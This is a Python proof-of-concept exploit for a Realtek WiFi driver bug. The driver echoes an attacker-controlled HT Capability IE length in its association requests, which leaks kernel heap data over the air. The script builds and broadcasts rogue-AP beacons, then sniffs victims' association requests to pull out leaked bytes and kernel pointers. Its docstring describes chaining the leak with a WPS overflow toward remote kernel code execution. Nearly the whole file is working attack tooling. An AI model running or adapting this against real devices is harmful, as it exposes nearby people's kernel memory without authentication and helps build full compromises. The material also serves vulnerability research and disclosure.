#!/usr/bin/env python3
"""
PoC: Kernel heap information leak over the air via oversized HT Capability IE
in rtl8723bs (and rtl8812au, rtl8188eus, rtl8723du, 8821cu).

VULNERABILITY:
  issue_assocreq() copies sizeof(struct HT_caps_element) = 26 bytes INTO the
  driver's HT_caps struct from a received beacon, but then copies pIE->length
  bytes (attacker-controlled) OUT of that struct into the association request
  frame sent over the air. If pIE->length > 26, the extra bytes are kernel
  heap data from fields AFTER HT_caps in struct mlme_ext_info:

    memcpy(&pmlmeinfo->HT_caps, pIE->data, sizeof(struct HT_caps_element)); // 26 bytes IN
    rtw_set_ie(pframe, WLAN_EID_HT_CAPABILITY, pIE->length, &pmlmeinfo->HT_caps, ...); // pIE->length OUT

  The association request frame is an unencrypted 802.11 management frame,
  even when the connection uses WPA2/WPA3.

LEAKED DATA (kernel heap, struct mlme_ext_info fields after HT_caps):
  offset  0..25  = struct HT_caps_element (26 bytes, the legitimate data)
  offset 26..46  = struct HT_info_element (21 bytes, HT Operation data)
  offset 47+     = struct wlan_bssid_ex network (large struct with kernel
                   pointers, MAC addresses, SSID, IE buffer — defeats KASLR)

ATTACK SCENARIO:
  1. Attacker broadcasts a beacon for a rogue AP (matching a saved SSID, or
     any open network the victim auto-connects to) with an HT Capability IE
     whose length field is set to e.g. 100 instead of the standard 26.
  2. Victim auto-connects (NetworkManager/wpa_supplicant sees a known SSID).
  3. Victim's driver sends an association request over the air in cleartext,
     containing 100 bytes starting at HT_caps — 74 bytes of which are kernel
     heap data leaked from the struct.
  4. Attacker captures the assoc-req with a second card in monitor mode.

THREE MODES:
  --pcap FILE     Write a rogue-AP beacon with the oversized HT Cap IE to pcap.
  --inject IFACE  Broadcast the beacon over a monitor-mode interface.
  --capture IFACE Capture assoc-req frames on a monitor-mode interface and
                  extract the leaked bytes beyond offset 26 (the analysis side).

AFFECTED DRIVERS (same code path, confirmed by source review):
  - drivers/staging/rtl8723bs  (in-tree)
  - aircrack-ng/rtl8812au      (out-of-tree)
  - aircrack-ng/rtl8188eus     (out-of-tree)
  - lwfinger/rtl8723du         (out-of-tree)
  - morrownr/8821cu            (out-of-tree)

COMBINED WITH THE WPS OVERFLOW:
  This leak defeats KASLR (kernel heap pointers in the leaked data reveal the
  kernel's address layout). Combined with the WPS Selected Registrar stack
  overflow (same driver, same PoC directory), an attacker with two WiFi cards
  could:
    1. Leak heap addresses via this bug (rogue AP → victim connects → capture)
    2. Use the addresses to build a targeted ROP payload
    3. Trigger the WPS stack overflow (crafted beacon during scan) with the
       payload → potential ring-0 code execution, remote, unauthenticated.

"""

import argparse
import struct
import sys
import time

# ─── 802.11 Beacon frame constants ──────────────────────────────────────────

FRAME_CTRL_BEACON = 0x0080
BROADCAST = b"\xff\xff\xff\xff\xff\xff"
FAKE_BSSID = b"\x00\x13\x37\xde\xad\x02"  # Different from the WPS PoC
BEACON_INTERVAL = 100
CAPABILITY_ESS = 0x0001

# Standard HT Capability IE is exactly 26 bytes of data.
HT_CAPS_REAL_SIZE = 26
WLAN_EID_HT_CAPABILITY = 45  # 0x2D


def build_ht_caps_ie(advertised_length=100):
    """Build an HT Capability IE with length field = advertised_length instead
    of the standard 26. The first 26 bytes are legitimate HT caps data; the
    remaining (advertised_length - 26) bytes are padding that, in the driver's
    issue_assocreq, get replaced by kernel heap data when the driver echoes
    the IE back with the attacker's length field."""
    # Standard HT caps (26 bytes): basic, non-fancy capabilities
    ht_data = bytearray(advertised_length)
    # HT Capabilities Info (2 bytes): support 20/40 MHz, short GI
    ht_data[0] = 0x2C  # HT cap info low byte
    ht_data[1] = 0x01  # HT cap info high byte
    # A-MPDU Parameters (1 byte)
    ht_data[2] = 0x17
    # Supported MCS Set (16 bytes): MCS 0-7
    ht_data[3] = 0xFF  # MCS 0-7
    # The rest stays zero (HT Extended Caps, Beamforming, ASEL)

    # The bytes past offset 26 are filler — on a real capture, these would
    # be replaced by whatever kernel heap data the driver leaks.
    for i in range(HT_CAPS_REAL_SIZE, advertised_length):
        ht_data[i] = 0xCC  # Marker: easy to distinguish from real data

    return struct.pack("BB", WLAN_EID_HT_CAPABILITY, advertised_length) + bytes(ht_data)


def build_ssid_ie(ssid=b"LEAK_TEST_AP"):
    return struct.pack("BB", 0x00, len(ssid)) + ssid


def build_supported_rates_ie():
    rates = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
    return struct.pack("BB", 0x01, len(rates)) + rates


def build_ds_ie(channel=6):
    return struct.pack("BBB", 0x03, 1, channel)


def build_beacon(ht_length=100, ssid=b"LEAK_TEST_AP", channel=6):
    """Build a beacon with an oversized HT Capability IE."""

    fc = struct.pack("<H", FRAME_CTRL_BEACON)
    duration = struct.pack("<H", 0)
    addr1 = BROADCAST
    addr2 = FAKE_BSSID
    addr3 = FAKE_BSSID
    seq_ctrl = struct.pack("<H", 0)
    mac_header = fc + duration + addr1 + addr2 + addr3 + seq_ctrl

    timestamp = struct.pack("<Q", 0)
    interval = struct.pack("<H", BEACON_INTERVAL)
    capability = struct.pack("<H", CAPABILITY_ESS)
    fixed = timestamp + interval + capability

    ies = b""
    ies += build_ssid_ie(ssid)
    ies += build_supported_rates_ie()
    ies += build_ds_ie(channel)
    ies += build_ht_caps_ie(ht_length)

    return mac_header + fixed + ies


# ─── Output modes ───────────────────────────────────────────────────────────


def write_pcap(frame, path):
    """Write a single-frame pcap (LinkType 105 = IEEE 802.11)."""
    hdr = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 105)
    ts_sec = int(time.time())
    pkt = struct.pack("<IIII", ts_sec, 0, len(frame), len(frame)) + frame
    with open(path, "wb") as f:
        f.write(hdr + pkt)
    print(f"[+] Wrote {len(frame)}-byte beacon to {path}")
    print(f"    Open with: wireshark {path}")


def hexdump(data, width=16, offset=0):
    for i in range(0, len(data), width):
        chunk = data[i : i + width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {offset + i:04x}  {hex_part:<{width * 3}}  {ascii_part}")


def inject_beacon(frame, iface, count=200, interval_ms=102):
    """Broadcast the rogue AP beacon."""
    try:
        from scapy.all import sendp, RadioTap
    except ImportError:
        print("ERROR: scapy not installed (pacman -S python-scapy)", file=sys.stderr)
        sys.exit(1)

    pkt = RadioTap() / frame
    print(f"[+] Injecting {count} rogue-AP beacons on {iface}...")
    print(f"    SSID: LEAK_TEST_AP | BSSID: {FAKE_BSSID.hex(':')}")
    print(f"    HT Capability IE length: 100 (standard: 26)")
    print(f"    When a victim with rtl8723bs/rtl8812au/etc connects,")
    print(f"    its assoc-req will contain 74 bytes of kernel heap data.")
    print(f"    Capture with: sudo python3 {sys.argv[0]} --capture <monitor_iface>")
    print()
    sendp(pkt, iface=iface, count=count, inter=interval_ms / 1000.0, verbose=True)


def capture_assoc_req(iface):
    """Capture association request frames and look for oversized HT Cap IEs
    that contain the leaked kernel heap data."""
    try:
        from scapy.all import sniff, Dot11, Dot11AssoReq, Dot11Elt
    except ImportError:
        print("ERROR: scapy not installed (pacman -S python-scapy)", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Listening for association requests on {iface}...")
    print(f"    Looking for HT Capability IE with length > {HT_CAPS_REAL_SIZE}")
    print(f"    (Press Ctrl+C to stop)")
    print()

    def handler(pkt):
        if not pkt.haslayer(Dot11):
            return
        # Subtype 0 = Association Request
        if pkt[Dot11].type != 0 or pkt[Dot11].subtype != 0:
            return

        print(f"[!] Association Request from {pkt[Dot11].addr2} to {pkt[Dot11].addr1}")

        # Walk the IEs
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == WLAN_EID_HT_CAPABILITY:
                ie_data = bytes(elt.info)
                ie_len = len(ie_data)
                print(
                    f"    HT Capability IE: length={ie_len} (standard={HT_CAPS_REAL_SIZE})"
                )

                if ie_len > HT_CAPS_REAL_SIZE:
                    leaked = ie_data[HT_CAPS_REAL_SIZE:]
                    print(
                        f"    *** LEAK DETECTED: {len(leaked)} bytes of kernel heap data ***"
                    )
                    print(f"    Leaked bytes (past struct HT_caps_element):")
                    hexdump(leaked, offset=HT_CAPS_REAL_SIZE)

                    # Check for potential kernel pointers (0xffff prefix on x86_64)
                    for i in range(0, len(leaked) - 7, 8):
                        qword = int.from_bytes(leaked[i : i + 8], "little")
                        if (qword >> 48) == 0xFFFF:
                            print(
                                f"    *** POTENTIAL KERNEL POINTER at offset {HT_CAPS_REAL_SIZE + i}: 0x{qword:016x} ***"
                            )

                    print()
                else:
                    print(f"    (standard size, no leak)")
            elt = elt.payload.getlayer(Dot11Elt)

    sniff(iface=iface, prn=handler, store=0)


# ─── Main ────────────────────────────────────────────────────────────────────


def main():
    p = argparse.ArgumentParser(
        description="PoC: rtl8723bs/rtl8812au HT Capability heap information leak",
    )
    p.add_argument("--pcap", metavar="FILE", help="Write rogue-AP beacon to pcap")
    p.add_argument(
        "--inject",
        metavar="IFACE",
        help="Broadcast rogue-AP beacon (monitor mode, root)",
    )
    p.add_argument(
        "--capture",
        metavar="IFACE",
        help="Capture assoc-reqs and extract leaked data (monitor mode, root)",
    )
    p.add_argument("--hex", action="store_true", help="Print raw frame hex dump")
    p.add_argument(
        "--ht-length",
        type=int,
        default=100,
        help="Advertised HT Capability IE length (default: 100, standard: 26)",
    )
    p.add_argument(
        "--ssid",
        type=str,
        default="LEAK_TEST_AP",
        help="SSID to use for the rogue AP beacon",
    )
    p.add_argument("--count", type=int, default=200, help="Number of beacons to inject")
    args = p.parse_args()

    if args.capture:
        capture_assoc_req(args.capture)
        return

    if not args.pcap and not args.inject and not args.hex:
        args.pcap = "/tmp/rtl_ht_caps_leak.pcap"
        print("[*] No mode specified, defaulting to --pcap /tmp/rtl_ht_caps_leak.pcap")
        print()

    frame = build_beacon(ht_length=args.ht_length, ssid=args.ssid.encode())

    print(f"[*] Crafted rogue-AP beacon: {len(frame)} bytes")
    print(f"    SSID: {args.ssid}")
    print(f"    BSSID: {FAKE_BSSID.hex(':')}")
    print(
        f"    HT Capability IE length: {args.ht_length} (standard: {HT_CAPS_REAL_SIZE})"
    )
    print(
        f"    Kernel heap leak: {max(0, args.ht_length - HT_CAPS_REAL_SIZE)} bytes per assoc-req"
    )
    print()

    print(
        "[*] Vulnerable code path in issue_assocreq() (same in all affected drivers):"
    )
    print()
    print("    // 26 bytes copied IN (bounded by sizeof):")
    print("    memcpy(&pmlmeinfo->HT_caps, pIE->data, sizeof(struct HT_caps_element));")
    print()
    print(f"    // {args.ht_length} bytes copied OUT (attacker's length field):")
    print("    rtw_set_ie(pframe, WLAN_EID_HT_CAPABILITY, pIE->length,")
    print("               (u8 *)(&pmlmeinfo->HT_caps), &pattrib->pktlen);")
    print()
    print(
        f"    // bytes [{HT_CAPS_REAL_SIZE}..{args.ht_length - 1}] = kernel heap data from:"
    )
    print("    //   struct HT_info_element  HT_info;    // 21 bytes")
    print("    //   struct wlan_bssid_ex    network;     // pointers, MACs, IEs")
    print("    //   struct FW_Sta_Info      FW_sta_info; // ...")
    print()

    if args.hex:
        print("[*] Raw frame hex dump:")
        hexdump(bytes(frame))
        print()

    if args.pcap:
        write_pcap(frame, args.pcap)

    if args.inject:
        inject_beacon(frame, args.inject, count=args.count)


if __name__ == "__main__":
    main()
